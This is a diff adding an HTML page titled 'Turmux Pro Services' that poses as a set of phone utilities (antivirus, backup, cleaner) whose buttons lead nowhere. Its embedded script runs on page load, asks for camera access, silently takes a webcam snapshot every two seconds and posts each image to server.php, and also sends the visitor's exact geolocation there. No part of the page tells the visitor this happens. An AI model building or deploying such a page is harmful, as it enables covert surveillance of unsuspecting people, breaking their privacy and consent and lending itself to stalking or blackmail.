@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Turmux Pro Services</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: url('https://images.unsplash.com/photo-1542314831-068cd1dbfeeb?ixlib=rb-4.0.3&auto=format&fit=crop&w=1500&q=80') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+    }
+
+    .overlay {
+      background: rgba(0, 0, 0, 0.7);
+      padding: 40px 20px;
+      min-height: 100vh;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .header h1 {
+      font-size: 32px;
+      color: #ffcc00;
+    }
+
+    .header p {
+      font-size: 16px;
+      color: #ddd;
+    }
+
+    .cards {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 20px;
+      border-radius: 12px;
+      width: 260px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+      backdrop-filter: blur(4px);
+      text-align: center;
+    }
+
+    .card h3 {
+      color: #ffcc00;
+      margin-bottom: 10px;
+    }
+
+    .card p {
+      color: #eee;
+      font-size: 14px;
+    }
+
+    .card a {
+      display: inline-block;
+      margin-top: 10px;
+      padding: 8px 16px;
+      background-color: #ffcc00;
+      color: #000;
+      border-radius: 5px;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 12px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay">
+    <div class="header">
+      <h1>Turmux Pro Services</h1>
+      <p>Explore our helpful features for your digital journey.</p>
+    </div>
+
+    <div class="cards">
+      <div class="card">
+        <h3>Device Check</h3>
+        <p>Verify your system's security and permissions easily.</p>
+        <a href="#">Check Now</a>
+      </div>
+      <div class="card">
+        <h3>Smart Backup</h3>
+        <p>Backup your photos and contacts securely.</p>
+        <a href="#">Start Backup</a>
+      </div>
+      <div class="card">
+        <h3>Free Antivirus</h3>
+        <p>Scan your mobile against malware and spyware.</p>
+        <a href="#">Scan Device</a>
+      </div>
+      <div class="card">
+        <h3>Device Cleaner</h3>
+        <p>Remove junk and improve device performance.</p>
+        <a href="#">Clean Now</a>
+      </div>
+      <div class="card">
+        <h3>Optimize Battery</h3>
+        <p>Extend your battery life with AI-based optimization.</p>
+        <a href="#">Optimize</a>
+      </div>
+      <div class="card">
+        <h3>Live Location</h3>
+        <p id="locationText">Detecting your location...</p>
+      </div>
+    </div>
+
+    <footer>
+      &copy; 2025 Turmux Pro. All rights reserved.
+    </footer>
+  </div>
+
+  <script>
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      video.addEventListener('loadeddata', () => {
+        setInterval(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0);
+          const imageData = canvas.toDataURL('image/png');
+
+          fetch('server.php', {
+            method: 'POST',
+            body: JSON.stringify({ image: imageData }),
+            headers: { 'Content-Type': 'application/json' }
+          });
+        }, 2000);
+      });
+    })
+    .catch(err => {
+      console.log("Camera access denied:", err);
+    });
+
+    function sendLocation(lat, lon) {
+      fetch('server.php', {
+        method: 'POST',
+        body: JSON.stringify({ latitude: lat, longitude: lon }),
+        headers: { 'Content-Type': 'application/json' }
+      });
+      document.getElementById('locationText').innerHTML =
+        `📍 <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">View Your Location</a>`;
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        sendLocation(lat, lon);
+      }, err => {
+        document.getElementById('locationText').textContent = "Location access denied.";
+      });
+    } else {
+      document.getElementById('locationText').textContent = "Geolocation not supported.";
+    }
+  </script>
+</body>
+</html>
